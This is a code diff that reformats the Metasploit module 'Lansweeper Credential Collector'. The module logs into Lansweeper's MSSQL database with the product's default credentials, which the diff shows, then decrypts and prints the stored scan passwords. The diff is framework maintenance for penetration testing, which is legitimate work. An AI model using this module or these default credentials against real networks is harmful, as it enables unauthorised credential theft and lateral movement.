@@ -8,40 +8,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Lansweeper Credential Collector',
-      'Description' => %q(
-        Lansweeper stores the credentials it uses to scan the computers
-        in its Microsoft SQL database.  The passwords are XTea-encrypted with a
-        68 character long key, in which the first 8 characters are stored with
-        the password in the database and the other 60 is static. Lansweeper, by
-        default, creates an MSSQL user "lansweeperuser" with the password is
-        "mysecretpassword0*", and stores its data in a database called
-        "lansweeperdb". This module will query the MSSQL database for the
-        credentials.
-      ),
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Lansweeper Credential Collector',
+        'Description' => %q{
+          Lansweeper stores the credentials it uses to scan the computers
+          in its Microsoft SQL database.  The passwords are XTea-encrypted with a
+          68 character long key, in which the first 8 characters are stored with
+          the password in the database and the other 60 is static. Lansweeper, by
+          default, creates an MSSQL user "lansweeperuser" with the password is
+          "mysecretpassword0*", and stores its data in a database called
+          "lansweeperdb". This module will query the MSSQL database for the
+          credentials.
+        },
+        'Author' => [
           'sghctoma <tamas.szakaly[at]praudit.hu>', # Lansweeper RCE + Metasploit implementation
           'eq <balazs.bucsay[at]praudit.hu>', # Lansweeper RCE + discovering default credentials
           'calderpwn <calderon[at]websec.mx>' # Module for lansweeper (5.3.0.8)
         ],
-      'License' => MSF_LICENSE,
-      'DefaultOptions'  =>
-        {
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
           'USERNAME' => 'lansweeperuser',
           'PASSWORD' => 'mysecretpassword0*'
         },
-      'References' =>
-        [
+        'References' => [
           ['URL', 'http://www.lansweeper.com'],
           ['URL', 'http://www.praudit.hu/prauditeng/index.php/blog/a-lansweeper-es-a-tea']
-        ]))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb'])
     ])
-
   end
 
   def uint32(n)
@@ -146,7 +151,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    result[:rows].each do |row|""
+    result[:rows].each do |row|
       pw = lsw_decrypt(row[2])
 
       print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}")
